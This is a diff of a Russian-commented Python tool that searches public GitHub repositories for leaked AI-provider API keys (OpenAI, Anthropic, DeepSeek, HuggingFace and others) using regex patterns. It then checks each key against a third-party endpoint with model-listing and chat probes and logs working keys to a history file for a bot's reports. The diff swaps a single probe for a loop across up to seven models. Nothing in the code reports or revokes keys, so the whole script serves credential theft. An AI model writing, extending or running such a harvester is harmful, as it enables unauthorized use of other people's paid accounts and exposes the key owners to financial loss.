@@ -2,8 +2,7 @@
 github_key_parser.py
 Парсер ключей из публичных репозиториев GitHub.
 Поддерживает: OpenAI, Anthropic, DeepSeek, Moonshot/Kimi, Qwen, MiniMax,
-Zhipu/GLM, HuggingFace, Cohere, а также контекстный поиск для кастомных
-провайдеров (morph и подобных).
+Zhipu/GLM, HuggingFace, Cohere, а также контекстный поиск.
 """
 
 import os
@@ -36,8 +35,6 @@ DEFAULT_ENDPOINT = "https://chat.kxsb.org/api/v1"
 DEFAULT_MODEL = "azure-5k/deepseek-v4.1-flash"
 
 # ─── паттерны ключей ───────────────────────────────────────────────────────
-# порядок важен: специфичные префиксы идут раньше общего sk-,
-# иначе generic-sk «съест» sk-ant- и sk-proj-.
 
 KEY_PATTERNS = [
     # OpenAI modern
@@ -61,13 +58,12 @@ KEY_PATTERNS = [
     {"provider": "huggingface",    "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
     # Cohere
     {"provider": "cohere",         "regex": re.compile(r"\bco-[A-Za-z0-9_-]{20,}\b")},
-    # fallback: любой sk- (требует цифры, заглавные и строчные буквы, мин. 32 символа)
+    # fallback: любой sk- (строгая проверка: мин. 32 символа, есть цифры, заглавные и строчные)
     {"provider": "generic-sk",     "regex": re.compile(r"\bsk-(?=[A-Za-z0-9_-]*\d)(?=[A-Za-z0-9_-]*[A-Z])(?=[A-Za-z0-9_-]*[a-z])[A-Za-z0-9_-]{32,}\b")},
 ]
 
 
 def identify_key(token: str):
-    """Определяет провайдера по токену. Возвращает dict или None."""
     for pattern in KEY_PATTERNS:
         if pattern["regex"].fullmatch(token):
             return {"provider": pattern["provider"], "key": token}
@@ -75,7 +71,6 @@ def identify_key(token: str):
 
 
 def extract_keys_from_text(text: str):
-    """Извлекает все уникальные ключи из текста с определением провайдера."""
     seen = set()
     results = []
     for pattern in KEY_PATTERNS:
@@ -93,7 +88,6 @@ def extract_keys_from_text(text: str):
 # ─── GitHub Code Search ────────────────────────────────────────────────────
 
 def search_github_code(query: str, per_page: int = 30, max_pages: int = 3):
-    """Поиск файлов через GitHub Code Search API."""
     results = []
     page = 1
     while page <= max_pages:
@@ -111,7 +105,7 @@ def search_github_code(query: str, per_page: int = 30, max_pages: int = 3):
             time.sleep(retry_after)
             continue
         if resp.status_code == 422:
-            print("[!] GitHub отверг запрос (слишком широкий или невалидный)")
+            print("[!] GitHub отверг запрос")
             break
         resp.raise_for_status()
 
@@ -136,7 +130,6 @@ def search_github_code(query: str, per_page: int = 30, max_pages: int = 3):
 
 
 def fetch_file(repo: str, path: str) -> str:
-    """Скачивает сырой файл через GitHub Contents API."""
     url = f"https://api.github.com/repos/{repo}/contents/{path}"
     headers = {**HEADERS_GH, "Accept": "application/vnd.github.raw+json"}
     try:
@@ -149,10 +142,6 @@ def fetch_file(repo: str, path: str) -> str:
 # ─── сбор ключей ───────────────────────────────────────────────────────────
 
 def collect_keys(query: str, max_files: int = 50):
-    """
-    Стандартный поиск: ищет по запросу и извлекает все ключи.
-    Возвращает dict: {key: {provider, repo, path, html_url}}.
-    """
     print(f"[*] ищу: {query}")
     hits = search_github_code(query, max_pages=3)
 
@@ -176,10 +165,6 @@ def collect_keys(query: str, max_files: int = 50):
 
 
 def collect_keys_with_context(provider_marker: str, max_files: int = 50):
-    """
-    Контекстный поиск для неизвестных провайдеров (например, morph).
-    Ищет файлы, где есть и sk-, и маркер провайдера.
-    """
     print(f"[*] контекстный поиск по маркеру: {provider_marker}")
     query = f"sk- {provider_marker}"
     hits = search_github_code(query, max_pages=5)
@@ -208,7 +193,6 @@ def collect_keys_with_context(provider_marker: str, max_files: int = 50):
 # ─── проверка ключа ────────────────────────────────────────────────────────
 
 def check_key(api_key: str, base_url: str = DEFAULT_ENDPOINT):
-    """Проверяет ключ через GET /models."""
     url = f"{base_url.rstrip('/')}/models"
     headers = {"Authorization": f"Bearer {api_key}"}
     start = time.perf_counter()
@@ -234,36 +218,39 @@ def check_key(api_key: str, base_url: str = DEFAULT_ENDPOINT):
     }
 
 
-def probe_chat(api_key: str, base_url: str = DEFAULT_ENDPOINT, model: str = DEFAULT_MODEL):
-    """Отправляет минимальный chat-запрос для проверки реальной работы."""
+def probe_all_models(api_key: str, base_url: str, models: list[str], max_probes: int = 7):
+    """Перебирает до 7 моделей и собирает статусы."""
     url = f"{base_url.rstrip('/')}/chat/completions"
-    headers = {
-        "Authorization": f"Bearer {api_key}",
-        "Content-Type": "application/json",
-    }
-    payload = {
-        "model": model,
-        "messages": [{"role": "user", "content": "ping"}],
-        "max_tokens": 5,
-    }
-    start = time.perf_counter()
-    try:
-        resp = requests.post(url, headers=headers, json=payload, timeout=30)
-        latency = round(time.perf_counter() - start, 2)
-    except requests.RequestException as e:
-        return {"ok": False, "latency": None, "error": str(e)}
-    return {
-        "ok": resp.status_code == 200,
-        "status_code": resp.status_code,
-        "latency": latency,
-        "body_snippet": resp.text[:200].replace("\n", " ").strip(),
-    }
+    headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
+    
+    results = []
+    for model in models[:max_probes]:
+        payload = {"model": model, "messages": [{"role": "user", "content": "ping"}], "max_tokens": 5}
+        start = time.perf_counter()
+        resp = None
+        try:
+            resp = requests.post(url, headers=headers, json=payload, timeout=15)
+            latency = round(time.perf_counter() - start, 2)
+            ok = resp.status_code == 200
+            msg = resp.text[:80].replace("\n", " ").strip() if not ok else "OK"
+        except Exception as e:
+            ok, latency, msg = False, "?", str(e)
+            
+        results.append({
+            "model": model, 
+            "ok": ok, 
+            "status": getattr(resp, 'status_code', 'ERR'), 
+            "latency": latency, 
+            "msg": msg
+        })
+        time.sleep(0.5)
+        
+    return results
 
 
 # ─── форматирование ────────────────────────────────────────────────────────
 
-def format_report(endpoint, key, provider, check_result, probe_result=None, catalog=None):
-    """Форматирует отчёт в стиле пользователя."""
+def format_report(endpoint, key, provider, check_result, probe_results, catalog):
     lines = []
     lines.append("⚡️ Фаст-скан")
     lines.append(f"🌐 Endpoint: {endpoint}")
@@ -271,36 +258,31 @@ def format_report(endpoint, key, provider, check_result, probe_result=None, cata
     lines.append(f"🏷 Провайдер: {provider}")
     lines.append("")
 
-    if check_result.get("ok"):
+    working_probes = [p for p in probe_results if p["ok"]]
+    if working_probes:
         lines.append("🏆 ✅ working")
-        status_models = ", ".join(check_result.get("models", [])[:3]) or "OK"
-        lines.append(f"💬 {status_models}: OK ({check_result.get('latency', '?')}s)")
+        lines.append(f"💬 {working_probes[0]['model']}: OK ({working_probes[0]['latency']}s)")
     else:
-        lines.append("🏆 ❌ dead")
-        lines.append(f"💬 статус: {check_result.get('status_code')}")
+        lines.append("🏆 ❌ dead (все пробы отклонены)")
+    lines.append("")
 
-    if probe_result:
-        lines.append("")
-        lines.append("🧪 Пробы · 1:")
-        if probe_result.get("ok"):
-            lines.append(
-                f"{DEFAULT_MODEL} → {probe_result['status_code']} ✅ "
-                f"{probe_result['latency']}s «PONG-OK»"
-            )
+    lines.append(f"🧪 Пробы · {len(probe_results)}:")
+    for p in probe_results:
+        if p["ok"]:
+            lines.append(f"{p['model']} → {p['status']} ✅ {p['latency']}s «PONG-OK»")
         else:
-            lines.append(
-                f"{DEFAULT_MODEL} → {probe_result.get('status_code', 'ERR')} ❌ "
-                f"{probe_result.get('latency', '?')}s"
-            )
+            icon = "❓" if p["status"] == 403 else "❌"
+            err_msg = f" · 💬 {p['msg']}" if len(p['msg']) > 3 else ""
+            lines.append(f"{p['model']} → {p['status']} {icon} {p['latency']}s{err_msg}")
+    lines.append("")
 
     if catalog:
-        lines.append("")
         lines.append(f"📚 Каталог · {len(catalog)}:")
         for m in catalog[:10]:
             lines.append(m)
         if len(catalog) > 10:
-            lines.append(f"... и ещё {len(catalog) - 10}")
-
+            lines.append(f"… и ещё {len(catalog) - 10} — фулскан покажет все")
+    
     lines.append("")
     lines.append("💾 Записано в историю")
     return "\n".join(lines)
@@ -309,7 +291,6 @@ def format_report(endpoint, key, provider, check_result, probe_result=None, cata
 # ─── история ───────────────────────────────────────────────────────────────
 
 def append_history(entry: dict):
-    """Дописывает запись в JSON-историю."""
     history = []
     if os.path.exists(HISTORY_FILE):
         try:
@@ -321,47 +302,3 @@ def append_history(entry: dict):
     history.append(entry)
     with open(HISTORY_FILE, "w", encoding="utf-8") as f:
         json.dump(history, f, ensure_ascii=False, indent=2)
-
-
-def run_scan(query: str = None, context_marker: str = None, max_files: int = 30):
-    """
-    Точка входа для бота: сканирует, проверяет, возвращает список отчётов.
-    """
-    if context_marker:
-        found = collect_keys_with_context(context_marker, max_files=max_files)
-    else:
-        if not query:
-            query = "sk- OR sk-ant- OR sk-proj- OR hf_ language:Python OR language:JavaScript"
-        found = collect_keys(query, max_files=max_files)
-
-    if not found:
-        return [], "ключей не найдено"
-
-    reports = []
-    for key, meta in found.items():
-        chk = check_key(key)
-        prb = probe_chat(key) if chk.get("ok") else None
-        report = format_report(
-            endpoint=DEFAULT_ENDPOINT,
-            key=key,
-            provider=meta["provider"],
-            check_result=chk,
-            probe_result=prb,
-            catalog=chk.get("models"),
-        )
-        reports.append(report)
-
-        append_history({
-            "endpoint": DEFAULT_ENDPOINT,
-            "key": key,
-            "provider": meta["provider"],
-            "repo": meta["repo"],
-            "path": meta["path"],
-            "working": chk.get("ok", False),
-            "status_code": chk.get("status_code"),
-            "latency": chk.get("latency"),
-            "models": chk.get("models", []),
-        })
-        time.sleep(1)
-
-    return reports, None
